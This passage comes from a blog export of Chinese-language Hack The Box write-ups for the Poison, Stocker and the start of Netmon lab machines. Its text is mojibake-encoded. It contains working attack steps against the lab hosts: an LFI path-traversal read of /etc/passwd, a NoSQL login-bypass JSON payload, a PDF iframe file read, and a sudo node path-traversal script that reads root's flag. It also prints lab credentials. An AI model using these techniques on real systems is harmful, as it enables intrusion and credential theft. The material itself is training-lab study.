pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico\npop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin\nauditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin\nwww:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin\n_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin\nhast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin\nnobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\n_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin\nmessagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin\navahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin\ncups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin\ncharix:*:1001:1001:charix:/home/charix:/bin/csh\n```\nniceï¼Œå­˜åœ¨ LFI æ¼æ´ï¼Œç­›é€‰ä¸€ä¸‹å¯ç”¨è´¦æˆ·å…ˆ\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.84/browse.php?file=../../../../../etc/passwd|grep \"/bin/csh\"  \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1894  100  1894    0     0  11999      0 --:--:-- --:--:-- --:--:-- 12063\nroot:*:0:0:Charlie &:/root:/bin/csh\ncharix:*:1001:1001:charix:/home/charix:/bin/csh\n```\nå‘ç°å¯ä»¥ä½¿ç”¨ bash æƒé™çš„ç”¨æˆ·å°±ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ rootï¼Œä¸€ä¸ªæ˜¯ charixï¼Œå’±ä»¬è‚¯å®šä¸å¯èƒ½ç›´æ¥åˆ° root å§ï¼Ÿé‚£æˆ‘ä»¬å°±è‚¯å®šæ˜¯è¦æ‰¾ charix çš„çªç ´ç‚¹äº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.84/browse.php?file=pwdbackup.txt                         \nThis password is secure, it's encoded atleast 13 times.. what could go wrong really..\n\nVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU\nbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS\nbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW\nM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs\nWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy\neG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G\nWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw\nMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa\nT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k\nWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk\nWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0\nNFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT\nVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz\nWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW\nVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO\nUkd4RVdub3dPVU5uUFQwSwo=\n```\næœ‰ä¸€æ®µ base64ï¼Œè§£å¯†ä¸€ä¸‹çœ‹çœ‹\n\n```bash\nThis password is secure, it's encoded atleast 13 times.. what could go wrong really..\nè¿™ä¸ªå¯†ç æ˜¯å®‰å…¨çš„ï¼Œå®ƒè‡³å°‘è¢«ç¼–è¯‘äº† 13 æ¬¡...çœŸçš„ä¼šå‡ºä»€ä¹ˆé—®é¢˜...\n```\nè¿™ä»–å–µçš„å±…ç„¶å¾—è§£å¯† 13 æ¬¡ï¼ŒçœŸéº»çƒ¦\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# echo \"Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU\nbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS\nbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW\nM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs\nWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy\neG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G\nWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw\nMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa\nT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k\nWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk\nWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0\nNFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT\nVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz\nWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW\nVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO\nUkd4RVdub3dPVU5uUFQwSwo=\"|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d\nCharix!2#4%6&8(0\n```\næœ€åå¾—åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå»å°è¯•æ˜¯å¦å¯ä»¥ç™»å½• ssh\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh charix@10.10.10.84\nThe authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.\nED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.84' (ED25519) to the list of known hosts.\n(charix@10.10.10.84) Password for charix@Poison:\nLast login: Mon Mar 19 16:38:00 2018 from 10.10.14.4\nFreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017\n\nWelcome to FreeBSD!\n\nRelease Notes, Errata: https://www.FreeBSD.org/releases/\nSecurity Advisories:   https://www.FreeBSD.org/security/\nFreeBSD Handbook:      https://www.FreeBSD.org/handbook/\nFreeBSD FAQ:           https://www.FreeBSD.org/faq/\nQuestions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/\nFreeBSD Forums:        https://forums.FreeBSD.org/\n\nDocuments installed with the system are in the /usr/local/share/doc/freebsd/\ndirectory, or can be installed later with:  pkg install en-freebsd-doc\nFor other languages, replace \"en\" with a language code like de or fr.\n\nShow the version of FreeBSD installed:  freebsd-version ; uname -a\nPlease include that output and any error messages when posting questions.\nIntroduction to manual pages:  man man\nFreeBSD directory layout:      man hier\n\nEdit /etc/motd to change this login announcement.\nIf you want to play CDs with FreeBSD, a utility for this is already included.\nType 'cdcontrol' then 'help' to learn more.  (You may need to set the CDROM\nenvironment variable in order to make cdcontrol want to start.)\ncharix@Poison:~ % whoami&&id\ncharix\nuid=1001(charix) gid=1001(charix) groups=1001(charix)\n```\næˆåŠŸç™»å½• ssh\n\n```bash\ncharix@Poison:~ % cat user.txt \neaacdfb2d141b72a589233063604209c\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\ncharix@Poison:~ % ls\nsecret.zip      user.txt\ncharix@Poison:~ % ls -la\ntotal 48\ndrwxr-x---  2 charix  charix   512 Mar 19  2018 .\ndrwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..\n-rw-r-----  1 charix  charix  1041 Mar 19  2018 .cshrc\n-rw-rw----  1 charix  charix     0 Mar 19  2018 .history\n-rw-r-----  1 charix  charix   254 Mar 19  2018 .login\n-rw-r-----  1 charix  charix   163 Mar 19  2018 .login_conf\n-rw-r-----  1 charix  charix   379 Mar 19  2018 .mail_aliases\n-rw-r-----  1 charix  charix   336 Mar 19  2018 .mailrc\n-rw-r-----  1 charix  charix   802 Mar 19  2018 .profile\n-rw-r-----  1 charix  charix   281 Mar 19  2018 .rhosts\n-rw-r-----  1 charix  charix   849 Mar 19  2018 .shrc\n-rw-r-----  1 root    charix   166 Mar 19  2018 secret.zip\n-rw-r-----  1 root    charix    33 Mar 19  2018 user.txt\n```\nè¿™é‡Œæœ‰ä¸€ä¸ª secret.zip çš„æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# scp charix@10.10.10.84:/home/charix/secret.zip ./\n(charix@10.10.10.84) Password for charix@Poison:\nsecret.zip\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# file secret.zip \nsecret.zip: Zip archive data, at least v2.0 to extract, compression method=store\n```\nç¡®å®æ˜¯ zip ç±»å‹çš„\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# unzip secret.zip \nArchive:  secret.zip\n[secret.zip] secret password:\n```\nä½†æ˜¯éœ€è¦ä¸€ä¸ªè§£å‹å¯†ç ï¼Œå»ç ´è§£ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# zip2john secret.zip > hash                           \nver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 type=0\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:00 DONE (2023-02-08 19:04) 0g/s 16299Kp/s 16299Kc/s 16299KC/s \"2parrow\"..*7Â¡Vamos!\nSession completed.\n```\nçˆ†ç ´æ²¡æœ‰æˆåŠŸï¼Œå°è¯•ä¸€ä¸‹ charix çš„ç™»å½•å¯†ç å‘¢ï¼Ÿ\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# unzip secret.zip                 \nArchive:  secret.zip\n[secret.zip] secret password: \n extracting: secret\n```\nå¥½å§ï¼Œæ˜¯æˆ‘ç»™æƒ³å¤æ‚äº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# file secret    \nsecret: Non-ISO extended-ASCII text, with no line terminators\n                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# chmod +x secret\n                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ./secret \n./secret: 1: ï¿½ï¿½[: not found\n./secret: 1: Õ–z!: not found\n```\nä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…ˆæ”¾ç€å§ï¼Œå»çœ‹çœ‹æœ¬åœ°ç«¯å£\n\n```bash\ncharix@Poison:~ % netstat -an\nActive Internet connections (including servers)\nProto Recv-Q Send-Q Local Address          Foreign Address        (state)\ntcp4       0      0 10.10.10.84.22         10.10.16.2.46492       ESTABLISHED\ntcp4       0      0 127.0.0.1.25           *.*                    LISTEN\ntcp4       0      0 *.80                   *.*                    LISTEN\ntcp6       0      0 *.80                   *.*                    LISTEN\ntcp4       0      0 *.22                   *.*                    LISTEN\ntcp6       0      0 *.22                   *.*                    LISTEN\ntcp4       0      0 127.0.0.1.5801         *.*                    LISTEN\ntcp4       0      0 127.0.0.1.5901         *.*                    LISTEN\nudp4       0      0 *.514                  *.*                    \nudp6       0      0 *.514                  *.*                    \nActive UNIX domain sockets\nAddress          Type   Recv-Q Send-Q            Inode             Conn             Refs          Nextref Addr\nfffff80003b39d20 stream      0      0                0 fffff80003b39e10                0                0\nfffff80003b39e10 stream      0      0                0 fffff80003b39d20                0                0\nfffff80003b3a2d0 stream      0      0                0 fffff80003b3a3c0                0                0 /tmp/.X11-unix/X1\nfffff80003b3a3c0 stream      0      0                0 fffff80003b3a2d0                0                0\nfffff80003b3a5a0 stream      0      0                0 fffff80003b3a4b0                0                0 /tmp/.X11-unix/X1\nfffff80003b3a4b0 stream      0      0                0 fffff80003b3a5a0                0                0\nfffff80003b3a690 stream      0      0 fffff80003b32588                0                0                0 /tmp/.X11-unix/X1\nfffff80003b3ab40 stream      0      0 fffff80003ae6938                0                0                0 /var/run/devd.pipe\nfffff80003b3a0f0 dgram       0      0                0 fffff80003b3a960                0                0\nfffff80003b3a1e0 dgram       0      0                0 fffff80003b3a870                0 fffff80003b3a780\nfffff80003b3a780 dgram       0      0                0 fffff80003b3a870                0                0\nfffff80003b3a870 dgram       0      0 fffff80003c56000                0 fffff80003b3a1e0                0 /var/run/logpriv\nfffff80003b3a960 dgram       0      0 fffff80003c561d8                0 fffff80003b3a0f0                0 /var/run/log\nfffff80003b3aa50 seqpac      0      0 fffff80003ae6760                0                0                0 /var/run/devd.seqpacket.pipe\n```\nå‘ç°å¼€ç€ VNC ç«¯å£\n\n```bash\nps -aux\n\nroot   529   0.0  0.9  23620  8872 v0- I    11:33    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/\n```\næŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç° VNC æ˜¯ç”± root ç”¨æˆ·è¿è¡Œçš„\n\nè¿™è¾¹æ˜¯å†…ç½‘çš„ç«¯å£ï¼Œæˆ‘ä»¬æ— æ³•è®¿é—®ï¼Œç»™ä»–è½¬å‘å‡ºæ¥å°±å¯ä»¥äº†\n\n```bash\nssh -L 5901:127.0.0.1:5901 charix@10.10.10.84\n```\nç„¶åä½¿ç”¨ vncviewer è¿›è¡Œè¿æ¥\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# vncviewer 127.0.0.1::5901 -passwd secret\n```\n```bash\nroot@Poison:~ # whoami&&id\nroot\nuid=0(root) gid=0(wheel) groups=0(wheel),5(operator)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nroot@Poison:~ # cat root.txt \n716d04b188419cf2bb99d891272361f5\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Stocker- Hackthebox","url":"/2023/01/14/Hackthebox/Easy/Hackthebox-Stocker/","content":"\n# Hackthebox - Stocker\n# é¶åœºä¿¡æ¯\n![image](Hackthebox-Stocker/TPpQ-EMxXWuxhgAl9_7NOJhb7aRkyzU3JiN8hPqV22s.png)\n\n\n\n# é¶åœºç±»å‹\n![image](Hackthebox-Stocker/opqu06AoOlYHoIsYaWxITXxsaKQRRbq1ZvZT3PM8keY.png)\n\n\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.11.196\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 05:41 CST\nNmap scan report for 10.10.11.196\nHost is up (0.38s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)\n|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)\n|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://stocker.htb\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/23%OT=22%CT=1%CU=32979%PV=Y%DS=2%DC=T%G=Y%TM=63CDADB\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11\nOS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   274.38 ms 10.10.16.1\n2   456.09 ms 10.10.11.196\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.20 seconds\n```\nè¿™é‡Œéœ€è¦åŠ ä¸€ä¸ª hosts è§£æ\n\n```bash\necho 10.10.11.196 stocker.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Stocker/RF02Pe8VDnFsRZWvmu726Ul-KbLApPRqy3vRHtB0j0w.png)\n\nè®¿é—®åå°±æ˜¯ä¸ªé™æ€é¡µé¢ï¼Œæ²¡çœ‹åˆ°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿ï¼Œåšä¸€ä¸‹ fuzz å§\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://stocker.htb/ --no-error --append-domain\n===============================================================\nGobuster v3.3\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://stocker.htb/\n[+] Method:          GET\n[+] Threads:         200\n[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:      gobuster/3.3\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\n2023/01/23 05:53:18 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev.stocker.htb Status: 302 [Size: 28] [--> /login]\nProgress: 114420 / 114442 (99.98%)===============================================================\n2023/01/23 05:56:08 Finished\n===============================================================\n```\nå‘ç°ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼ŒåŠ å…¥ hosts è§£æ\n\n```bash\necho 10.10.11.196 dev.stocker.htb >> /etc/hosts\n```\nç„¶åå†å»è®¿é—®ä¸€ä¸‹\n\n## dev.stocker.htb\n![image](Hackthebox-Stocker/SjUGC_Avaejz5sxgi5JAwABUkDLE1bS16ImItymzCYU.png)\n\næ˜¯ä¸€ä¸ªç™»å½•æ¡†\n\n# æ¼æ´åˆ©ç”¨\nè¿™é‡Œæ˜¯ä¸€ä¸ªåŸºç¡€çš„ nosql æ³¨å…¥\n\n> [https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)\n\n![image](Hackthebox-Stocker/5cPzaDCwVCpIXEeKu5uvXvwY7Qu7DosD1PbGvtClfaE.png)\n\n\n\nä¿®æ”¹ Content-Type å†…å®¹ä¸º application/json\n\nç„¶åä½¿ç”¨ä¸Šé¢å‚è€ƒæ–‡çŒ®é‡Œçš„ `{\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"} }` è¿›è¡Œç»•è¿‡\n\n![image](Hackthebox-Stocker/5b8tEL_ka3ibmEDNOBqt3mm4-mKeKAZwB-gUiTR8YhY.png)\n\næˆåŠŸç™»å½•ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªè´­ç‰©ä¸­å¿ƒ\n\n![image](Hackthebox-Stocker/HWSFJdaynuHEbhdItVS3MzXKGS097mT-hwIwLkdAxrs.png)\n\néšä¾¿æ·»åŠ ä¸€ä¸ªç‰©å“ï¼Œç„¶åæŠ“ä¸ªåŒ…çœ‹çœ‹\n\n![image](Hackthebox-Stocker/QpfI-demVcNhMax9cU81KTiAlrJfo_NscnwZBU1eDIY.png)\n\nå»çœ‹ä¸€ä¸‹æäº¤åå¾—åˆ°çš„è®¢å•æ–‡ä»¶\n\n![image](Hackthebox-Stocker/FZxXiMx-LApNtC7TSsJHrhTB2WAwcRTvjZKHKMsNqyQ.png)\n\nå¾—åˆ°çš„æ˜¯ä¸€ä¸ª pdf æ ¼å¼çš„è®¢å•ï¼Œå°è¯•ä¿®æ”¹ä¸€ä¸‹ Title çš„å†…å®¹å‘¢ï¼Ÿ\n\n![image](Hackthebox-Stocker/NeiU6T4J9cQ8K3wRq93ILOWZeB32K60q3JyX-SNExjA.png)\n\n![image](Hackthebox-Stocker/_-i072QJXGkGQJbOzHemcHncz60mrn82p3-moAfFPek.png)\n\nokï¼Œä¹Ÿæ˜¯å¯ä»¥æˆåŠŸä¿®æ”¹çš„\n\né‚£ä¹ˆæˆ‘ä»¬æäº¤ iframe ä¹‹ç±»çš„ä½¿å…¶æ¸²æŸ“æ—¶åµŒå…¥æœ¬åœ°æ–‡ä»¶å‘¢ï¼Ÿ\n\n![image](Hackthebox-Stocker/0nISbFG003fHH61XLSqACns5a8ADhco6bDR8Z2kerZ0.png)\n\n![image](Hackthebox-Stocker/KmCcyvicIoEVcVT02SMiYKJ_V_xRASPXlUTKxxmmlIs.png)\n\nokï¼Œä¹Ÿå¯è¡Œï¼Œè¯»å–æˆåŠŸ\n\nç„¶åå°±æ˜¯æ— é™è¯»æ–‡ä»¶çš„æµ‹è¯•ï¼Œè¿™é‡Œç›´æ¥è·³è¿‡ï¼Œåœ¨ `/etc/passwd` è·å¾—äº†è´¦å·ã€‚\n\næ¥ç€åœ¨ `/var/www/dev/index.js` è·å¾—äº†å¯†ç \n\n![image](Hackthebox-Stocker/6HBzaCOKKXFZs9Fe6_YUgyPIfXvo7RY-ndbF35laOBU.png)\n\n```bash\nusername = angoose\npassword = IHeardPassphrasesArePrettySecure\n```\nç„¶åä½¿ç”¨ ssh è¿›è¡Œç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh angoose@10.10.11.196\nangoose@10.10.11.196's password: \nLast login: Sun Jan 22 22:39:59 2023 from 10.10.16.12\nangoose@stocker:~$ whoami&&id\nangoose\nuid=1001(angoose) gid=1001(angoose) groups=1001(angoose)\n```\næˆåŠŸè·å¾— user æƒé™\n\n```bash\nangoose@stocker:~$ ls\nuser.txt\nangoose@stocker:~$ cat user.txt\n6d51a15b13661ffb827c22f4a7662492\n```\næˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nangoose@stocker:~$ sudo -l\n[sudo] password for angoose: \nMatching Defaults entries for angoose on stocker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser angoose may run the following commands on stocker:\n    (ALL) /usr/bin/node /usr/local/scripts/*.js\n```\nå¯ä»¥ä½¿ç”¨ sudo æƒé™è°ƒç”¨ `/usr/bin/node` æ‰§è¡Œ `/usr/local/scripts/` ç›®å½•ä¸‹çš„æ‰€æœ‰ js æ–‡ä»¶\n\næˆ‘ä»¬çš„ç›®çš„åªæ˜¯è¦è·å– `/root/root.txt` æ–‡ä»¶çš„å†…å®¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ js read file æ¥è¿›è¡Œåˆ©ç”¨\n\n```bash\nconst fs = require('fs');\n\nfs.readFile('/root/root.txt', 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log(data);\n});\n```\nåœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ª js å†…å®¹ï¼Œç„¶åä½¿ç”¨ç›®å½•ç©¿è¶Šæ¥è¿›è¡Œè°ƒç”¨\n\n```bash\nangoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exp.js \n45d08dd713ea28830a34b4186236290e\n```\næˆåŠŸè°ƒç”¨å¹¶åˆ©ç”¨æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ js æ–‡ä»¶ï¼ŒæˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶\n\n\n\n\n\n\n\n","tags":["Hackthebox"]},{"title":"Netmon - Hackthebox","url":"/2023/01/08/Hackthebox/Easy/Hackthebox-Netmon/","content":"\n# Hackthebox - Netmon\n\n# é¶åœºä¿¡æ¯\n\n![](Hackthebox-Netmon/d_AhIc_7eAII8iPdwsHy8jsLbvFWxGMvcRif8JLnig8.png)\n\n# é¶åœºç±»å‹\n\n![](Hackthebox-Netmon/xwcrA6hlnGsF3RbdRNGBi5kZDsJRxJp6Jw-bicGeCQs.png)\n\n# ä¿¡æ¯æ”¶é›†\n\n## Nmap\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.10.152\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 04:24 CST\nNmap scan report for 10.10.10.152\nHost is up (0.49s latency).\nNot shown: 65522 closed tcp ports (reset)\nPORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-02-19  11:18PM                 1024 .rnd\n| 02-25-19  09:15PM       <DIR>          inetpub\n| 07-16-16  08:18AM       <DIR>          PerfLogs\n| 02-25-19  09:56PM       <DIR>          Program Files\n| 02-02-19  11:28PM       <DIR>          Program Files (x86)\n| 02-03-19  07:08AM       <DIR>          Users\n|_02-25-19  10:49PM       <DIR>          Windows\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-server-header: PRTG/18.1.37.13946\n|_http-trane-info: Problem with XML parsing of /evox/about\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: 